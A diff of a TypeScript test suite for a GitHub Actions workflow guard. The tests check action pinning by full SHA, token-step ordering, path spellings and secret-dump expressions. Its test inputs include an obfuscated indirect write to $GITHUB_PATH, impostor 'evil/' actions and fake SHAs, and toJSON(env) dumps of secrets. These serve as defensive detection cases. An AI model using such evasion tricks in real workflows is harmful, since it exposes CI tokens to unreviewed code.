+  // The header's text-check caveat: a run: step that reaches a runner file another way may only
+  // sit where nothing after it holds the token.
+  it('leaves a run: step that reaches $GITHUB_PATH another way alone only after the last token run: step', () => {
+    const indirect = `      - name: Tidy\n        run: 'v=GITHUB_; v="\${v}PATH"; echo "$PWD/bin" >> "\${!v}"'\n`;
+    expect(rules(tokenJob() + indirect)).toEqual([]);
+    expect(rules(tokenJob('', indirect))).toEqual(['step-order']);
+    expect(rules(actionJob(indirect))).toEqual(['post-stage']);
+  });
+
+  it('flags setup-node with the token in its env, which would export it job-wide, before or after the token step', () => {
+    const setup = `      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1\n        with:\n          registry-url: https://npm.pkg.github.com\n        env:\n          NODE_AUTH_TOKEN: ${TOK}\n`;
+    // Before it, the install that follows is also flagged: setup-node's post stage would hold the token.
+    expect(rules(tokenJob('', setup))).toEqual(['non-install-step', 'post-stage', 'setup-with']);
+    expect(rules(tokenJob() + setup)).toEqual(['non-install-step']);
+  });
+
+  it('flags another job only for its own steps', () => {
+    expect(rules(`${actionJob()}  later:\n    needs: build\n    steps:\n      - run: npm test\n`)).toEqual([]);
+  });
+
+  it('flags a step appended to the live publish job after its build step', () => {
+    const wf = load(WORKFLOWS, 'web-image.yml') as { jobs: { publish: { steps: unknown[] } } };
+    wf.jobs.publish.steps.push({ name: 'Appended', run: 'echo ok' });
+    expect(checkWorkflow('web-image.yml', wf, TOKEN_STEPS)).toEqual([{ file: 'web-image.yml', where: 'publish > Appended > step', rule: 'post-stage' }]);
+  });
+
+  it('ends the live publish job with its build step and checks the pushed bytes in a job that needs it', () => {
+    const jobs = (load(WORKFLOWS, 'web-image.yml') as { jobs: Record<string, { needs?: unknown; permissions?: unknown; steps: { name?: string; run?: string }[] }> }).jobs;
+    expect(jobs['publish'].steps.at(-1)?.name).toBe('Build and push');
+    const verify = jobs['verify-published'];
+    expect(verify.needs).toBe('publish');
+    expect(verify.permissions).toEqual({ contents: 'read', packages: 'read' });
+    expect(verify.steps.map((s) => s.name)).toEqual([
+      'Checkout code',
+      'Log in to GitHub Container Registry',
+      'Verify the PUBLISHED image runs as a non-root user',
+      'Verify the PUBLISHED image bundle signs in through OIDC only',
+      'Report the digest',
+    ]);
   });
 });
 
@@ -592,30 +887,267 @@ describe('secrets and env refs that name one entry, and the rest', () => {
   });
 
   it('reads values, not keys: a with: input or a workflow_call secret named secrets is not a ref', () => {
-    expect(rules('on:\n  workflow_call:\n    secrets:\n      KEY:\n        required: true\njobs:\n  t:\n    steps:\n      - uses: a/b@v1\n        with:\n          secrets: x\n')).toEqual([]);
+    expect(rules(`on:\n  workflow_call:\n    secrets:\n      KEY:\n        required: true\njobs:\n  t:\n    steps:\n      - uses: a/b@${SHA}\n        with:\n          secrets: x\n`)).toEqual([]);
   });
 
   it.each(['${{ env.FC_WEB_IMAGE }}', "${{ env['FC_WEB_IMAGE'] }}", "${{ ENV[ 'fc-x' ] }}", 'node_auth_token=NODE_AUTH_TOKEN', 'envs', 'MY_ENV', '${{ env._X }}'])(
     'accepts %s in with: on the token action step',
     (ref) => {
-      expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}\nwith:\n  x: ${JSON.stringify(ref)}`))).toEqual([]);
+      expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}\nwith:\n  labels: ${JSON.stringify(ref)}`))).toEqual([]);
     },
   );
 
   it.each(['${{ toJSON(env) }}', '${{ toJSON(ENV) }}', '${{ toJSON(env.*) }}', '${{ env.* }}', "${{ env[format('NODE_{0}', 'AUTH_TOKEN')] }}", '${{ env [matrix.k] }}', '${{ env.A.* }}', '${{ env.AB.* }}', '${{ env.9 }}'])(
     'flags %s in with: on the token action step as the whole env',
     (ref) => {
-      expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}\nwith:\n  x: ${JSON.stringify(ref)}`))).toEqual(['all-env']);
+      expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}\nwith:\n  labels: ${JSON.stringify(ref)}`))).toEqual(['all-env']);
     },
   );
 
-  it('reads values, not keys: a with: input named env is not a ref', () => {
-    expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}\nwith:\n  env: production`))).toEqual([]);
+  it('reads values, not keys: a with: input named env is not a ref (only an input the build action may not take)', () => {
+    expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}\nwith:\n  env: production`))).toEqual(['action-with']);
   });
 
   it('flags an env dump in an if: on the token step, and leaves it alone on a step without the token', () => {
     expect(rules(step('Install dependencies', "run: npm ci --ignore-scripts\nif: toJSON(env) != ''"))).toEqual(['all-env']);
     expect(rules("jobs:\n  t:\n    steps:\n      - run: echo '${{ toJSON(env) }}'\n")).toEqual([]);
+  });
+});
+
+// D5, D10: the setup and build actions run at one reviewed commit (each checked against its tag
+// with gh api), wherever they are used; a tag moves, and any other SHA may be a fork's commit.
+const PINNED: Readonly<Record<string, string>> = {
+  'actions/checkout': '3d3c42e5aac5ba805825da76410c181273ba90b1', // v7.0.1
+  'actions/setup-node': '949feb2413d6458794dcd2491c4babbbce0c15c1', // v7.1.0
+  'docker/setup-buildx-action': 'f87e5991a6d7451dcb8d9637bfbc97413f497069', // v4.4.1
+  'docker/metadata-action': 'dc802804100637a589fabce1cb79ff13a1411302', // v6.2.0
+  'docker/login-action': 'dbcb813823bdd20940b903addbd779551569679f', // v4.6.0
+  'docker/build-push-action': SHA, // v7.4.0
+};
+const IMPOSTER = 'f'.repeat(40);
+
+describe('setup and build actions pinned to one commit', () => {
+  const plainJob = (uses: string): Rule[] => rules(`jobs:\n  t:\n    steps:\n      - uses: ${uses}\n`);
+
+  it.each(Object.entries(PINNED))('accepts %s at %s in any job, owner and name in any case', (name, sha) => {
+    expect(plainJob(`${name}@${sha}`)).toEqual([]);
+    expect(plainJob(`${name.toUpperCase()}@${sha}`)).toEqual([]);
+    expect(rules(`${tokenJob()}      - uses: ${name}@${sha}\n`)).toEqual([]);
+  });
+
+  it.each(
+    Object.entries(PINNED).flatMap(([name, sha]) => [
+      `${name}@v1`,
+      `${name}@${sha.slice(0, 7)}`,
+      `${name}@${sha}0`,
+      // wk-09c-i2: a tag named after the pin ends with it but is another ref; so is a branch (wk-09c-i2b).
+      `${name}@v${sha}`,
+      `${name}@refs/tags/${sha}`,
+      `${name}@refs/heads/${sha}`,
+      `${name}@${sha.toUpperCase()}`,
+      `${name}@${IMPOSTER}`,
+      `${name}@${sha}@x`,
+      `${name}@`,
+      `${name.toUpperCase()}@v1`,
+    ]),
+  )('flags %s in a job without a token step and after the last one', (uses) => {
+    expect(plainJob(uses)).toEqual(['action-pin']);
+    expect(checkWorkflow('x.yml', parse(`${tokenJob()}      - uses: ${uses}\n`), fixtureAllowList('x.yml'))).toEqual([
+      { file: 'x.yml', where: 'build > #1 > uses', rule: 'action-pin' },
+    ]);
+  });
+
+  it('flags a setup action at another commit before a token step, and nothing else', () => {
+    expect(rules(tokenJob('', `      - uses: actions/setup-node@${IMPOSTER}\n        with:\n          node-version: 24\n`))).toEqual(['action-pin']);
+  });
+
+  it.each(['v', 'refs/tags/', 'refs/heads/', 'x'].map((prefix) => `${prefix}${PINNED['actions/setup-node']}`))(
+    'flags actions/setup-node@%s, a ref that ends with the pin, before a token step, and nothing else',
+    (ref) => {
+      expect(rules(tokenJob('', `      - uses: actions/setup-node@${ref}\n        with:\n          node-version: 24\n`))).toEqual(['action-pin']);
+    },
+  );
+
+  it('leaves other actions at a full SHA, local actions, images and a uses GitHub cannot parse alone', () => {
+    for (const uses of [
+      'actions/checkout',
+      `evil/checkout@${SHA}`,
+      `actions/checkout-x@${SHA}`,
+      `actions/upload-artifact@${SHA}`,
+      `github/codeql-action/init@${SHA}`,
+      './.github/actions/local',
+      '.\\.github\\actions\\local',
+      '$/.github/actions/local',
+      './.github/actions/a@b',
+      '.\\.github\\actions\\a@b',
+      'docker://alpine',
+      'docker://alpine:3',
+      `docker://alpine@sha256:${'a'.repeat(64)}`,
+    ]) {
+      expect(plainJob(uses)).toEqual([]);
+    }
+    expect(rules('jobs:\n  t:\n    steps:\n      - uses: 7\n')).toEqual([]);
+  });
+
+  it('pins the live allow-listed build action to its exact commit', () => {
+    expect(TOKEN_STEPS.get(stepId('web-image.yml', 'publish', 'Build and push'))).toEqual({ kind: 'action', uses: `docker/build-push-action@${SHA}` });
+  });
+});
+
+// wk-09c-i1: GitHub's runner reads owner/repo[/path]@ref by splitting the path on / and \ and
+// dropping empty segments (actions/runner PipelineTemplateConverter.cs), so every spelling below
+// runs the named action at that ref. The guard reads the name the same way before any lookup.
+const spellings = (name: string): string[] => {
+  const [owner, repo] = name.split('/');
+  return [`${owner}//${repo}`, `${owner}/${repo}/`, `/${owner}/${repo}`, `${owner}\\${repo}`];
+};
+/** Rules for uses in a job without a token step, and after the last step of a token job. */
+const anywhere = (uses: string): [Rule[], Rule[]] => [
+  rules(`jobs:\n  t:\n    steps:\n      - uses: ${uses}\n`),
+  checkWorkflow('x.yml', parse(`${tokenJob()}      - uses: ${uses}\n`), fixtureAllowList('x.yml')).map((v) => {
+    expect(v.where).toBe('build > #1 > uses');
+    return v.rule;
+  }),
+];
+
+describe('action paths read the way GitHub reads them', () => {
+  it.each(Object.keys(PINNED).flatMap((name) => [...spellings(name), `${name}/sub`].map((path) => `${path}@v1`)))(
+    'flags %s as the pinned action at another ref',
+    (uses) => {
+      expect(anywhere(uses)).toEqual([['action-pin'], ['action-pin']]);
+    },
+  );
+
+  it.each(Object.entries(PINNED).flatMap(([name, sha]) => spellings(name).map((path) => `${path.toUpperCase()}@${sha}`)))(
+    'accepts %s, the pinned action at its pinned commit',
+    (uses) => {
+      expect(anywhere(uses)).toEqual([[], []]);
+    },
+  );
+
+  it.each(Object.entries(PINNED).flatMap(([name, sha]) => spellings(name).flatMap((path) => [`${path}@v${sha}`, `${path}@refs/tags/${sha}`, `${path}@refs/heads/${sha}`])))(
+    'flags %s, a tag or branch named after the pin, as the pinned action at another ref',
+    (uses) => {
+      expect(anywhere(uses)).toEqual([['action-pin'], ['action-pin']]);
+    },
+  );
+
+  it('flags another spelling of a setup action at a tag before a token step twice: wrong place, wrong commit', () => {
+    expect(rules(tokenJob('', '      - uses: actions//checkout@v7\n'))).toEqual(['action-pin', 'step-order']);
+  });
+
+  it.each([...spellings('aquasecurity/trivy-action'), 'AquaSecurity\\setup-trivy'].map((path) => `${path}@0.28.0`))('flags %s as an unpinned aquasecurity action', (uses) => {
+    expect(anywhere(uses)).toEqual([['trivy-unpinned'], ['trivy-unpinned']]);
+  });
+
+  it.each(spellings('aquasecurity/trivy-action').map((path) => `${path}@${SHA}`))('accepts %s at a full SHA in a job without a token step', (uses) => {
+    expect(anywhere(uses)).toEqual([[], ['pre-stage']]);
+  });
+
+  it('reads a ref with a trailing newline as another ref', () => {
+    const at = (uses: string) => checkWorkflow('x.yml', { jobs: { t: { steps: [{ uses }] } } }, new Map()).map((v) => v.rule);
+    expect(at(`actions/checkout@${PINNED['actions/checkout']}\n`)).toEqual(['action-pin']);
+    expect(at(`actions/upload-artifact@${SHA}\n`)).toEqual(['action-sha']);
+    expect(at(`aquasecurity/trivy-action@${SHA}\n`)).toEqual(['trivy-unpinned']);
+  });
+});
+
+// WK-09c acceptance: every action pinned by full SHA. The setup and build actions are held to one
+// commit (ACTION_PINS); every other remote action names a full 40-hex commit.
+describe('every other remote action pinned by full SHA', () => {
+  it.each([
+    'actions/upload-artifact@v7',
+    'actions/upload-artifact@v7.0.2',
+    'github/codeql-action/init@v4',
+    'github/codeql-action/analyze@v4',
+    'github/codeql-action/upload-sarif@v4',
+    'github//codeql-action/init@v4',
+    `actions/upload-artifact@${SHA.slice(0, 7)}`,
+    `actions/upload-artifact@${SHA}0`,
+    `actions/upload-artifact@v${SHA}`,
+    `actions/upload-artifact@${SHA.slice(1)}`,
+    `actions/upload-artifact@${SHA.toUpperCase()}`,
+    `actions/upload-artifact@${'g'.repeat(40)}`,
+    `actions/upload-artifact@${SHA}@x`,
+    'actions/upload-artifact@',
+    'Docker://alpine@v1',
+    'aquasecurityx/trivy-action@v1',
+    'actions/upload-artifact/./merge@v7',
+    // wk-09c-i2: only ./ and .\ are local; a leading dot alone is a remote owner's name.
+    '.evil/checkout@v1',
+    '.github/actions/local@v1',
+  ])('flags %s in a job without a token step and after the last one', (uses) => {
+    expect(anywhere(uses)).toEqual([['action-sha'], ['action-sha']]);
+  });
+
+  it('flags an action at a tag before a token step twice: wrong place, not pinned', () => {
+    expect(rules(tokenJob('', '      - uses: actions/upload-artifact@v7\n'))).toEqual(['action-sha', 'step-order']);
+  });
+
+  it('pins every action of the live workflows by full SHA', () => {
+    const tags: string[] = [];
+    for (const file of readdirSync(WORKFLOWS).filter((f) => /\.ya?ml$/.test(f))) {
+      const jobs = (load(WORKFLOWS, file) as { jobs: Record<string, { uses?: string; steps?: { uses?: string }[] }> }).jobs;
+      for (const def of Object.values(jobs)) {
+        for (const uses of [def.uses, ...(def.steps ?? []).map((s) => s.uses)]) {
+          if (uses !== undefined && !uses.startsWith('./') && !/@[0-9a-f]{40}$/.test(uses)) tags.push(`${file}: ${uses}`);
+        }
+      }
+    }
+    expect(tags).toEqual([]);
+  });
+});
+
+// wk-09c-i3: an action's pre: stage runs at job start, before every main step (actions/runner
+// JobExtension.cs runs preJobSteps, then jobSteps; ActionManager.cs registers a pre for every remote
+// action at the root, composite ones included). So in a job with a token step every remote action,
+// wherever it sits, is one reviewed for that: a setup or build action at its pin, or one of these
+// at its commit, whose action.yml files (and their nested uses) have no pre: (checked with gh api).
+// A local action runs no pre (ActionRunner.cs), and a docker:// image has no action.yml.
+const LATER: Readonly<Record<string, string>> = {
+  'actions/upload-artifact': 'cf430e030ddbb5b0abf93d22962f4752f3646cd9', // v7.0.2
+  'aquasecurity/trivy-action': 'ed142fd0673e97e23eac54620cfb913e5ce36c25', // v0.36.0
+};
+
+describe('no action in a token job that may run a pre: stage before the token steps', () => {
+  it.each(
+    Object.entries(LATER).flatMap(([name, sha]) => [`${name}@${sha}`, `${name.toUpperCase()}@${sha}`, ...spellings(name).map((path) => `${path}@${sha}`)]),
+  )('accepts %s, a reviewed later action at its commit, after the last token step', (uses) => {
+    expect(anywhere(uses)).toEqual([[], []]);
+  });
+
+  it.each([
+    `evil/action@${SHA}`,
+    `actions/upload-artifact@${SHA}`,
+    `actions/upload-artifact@${IMPOSTER}`,
+    `aquasecurity/trivy-action@${LATER['actions/upload-artifact']}`,
+    `actions/upload-artifact-x@${LATER['actions/upload-artifact']}`,
+    `xactions/upload-artifact@${LATER['actions/upload-artifact']}`,
+    'github/codeql-action/init@24c54180a607b1449ed407dd24f251e4e9147c8d',
+    `aquasecurity/setup-trivy@${LATER['aquasecurity/trivy-action']}`,
+  ])('flags %s after the last token step, and leaves it alone in a job without one', (uses) => {
+    expect(anywhere(uses)).toEqual([[], ['pre-stage']]);
+    expect(rules(`${tokenJob()}  other:\n    steps:\n      - uses: ${uses}\n`)).toEqual([]);
+  });
+
+  it('flags an unreviewed action before a token step twice: wrong place, may run a pre: stage', () => {
+    expect(checkWorkflow('x.yml', parse(tokenJob('', `      - uses: evil/action@${SHA}\n`)), fixtureAllowList('x.yml'))).toEqual([
+      { file: 'x.yml', where: 'build > #0 > step', rule: 'step-order' },
+      { file: 'x.yml', where: 'build > #0 > uses', rule: 'pre-stage' },
+    ]);
+  });
+
+  it('flags an unreviewed action after a token action for both stages', () => {
+    expect(checkWorkflow('x.yml', parse(actionJob(`      - name: Later\n        uses: evil/action@${SHA}\n`)), fixtureAllowList('x.yml'))).toEqual([
+      { file: 'x.yml', where: 'build > Later > step', rule: 'post-stage' },
+      { file: 'x.yml', where: 'build > Later > uses', rule: 'pre-stage' },
+    ]);
+  });
+
+  it('leaves a local action and a docker:// image after the last token step alone', () => {
+    for (const uses of ['./.github/actions/local', '.\\.github\\actions\\local', 'docker://alpine:3']) {
+      expect(rules(`${tokenJob()}      - uses: ${uses}\n`)).toEqual([]);
+    }
   });
 });
 
